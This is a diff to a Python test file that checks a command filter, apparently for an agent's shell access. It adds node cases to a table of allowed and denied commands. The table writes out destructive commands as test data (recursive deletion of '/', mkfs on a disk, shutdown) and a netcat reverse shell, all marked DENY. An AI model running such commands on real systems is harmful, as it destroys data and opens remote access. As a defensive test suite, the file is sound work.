@@ -104,6 +104,10 @@ def test_workspace_edit_refuses_missing_or_ambiguous(tmp_path: Path) -> None:
         ("python -c \"import shutil; shutil.rmtree('/')\"", Verdict.DENY),
         ("python3 -c \"import os; os.removedirs('/var')\"", Verdict.DENY),
         ("python -c \"print(shutil.which('ls'))\"", Verdict.ALLOW),  # mentions shutil, not rmtree
+        # node is allowlisted too: a recursive fs delete must be caught, a single
+        # unlink must not be over-blocked.
+        ("node -e \"require('fs').rmSync('/', {recursive:true})\"", Verdict.DENY),
+        ("node -e \"fs.unlinkSync('temp.txt')\"", Verdict.ALLOW),  # single file, not recursive
         ('bash -c "mkfs.ext4 /dev/sda"', Verdict.DENY),  # -c inner at a command position
         ('bash -c "shutdown now"', Verdict.DENY),
         ("nc host 4444 -e /bin/sh", Verdict.DENY),  # reverse shell, -e after host/port
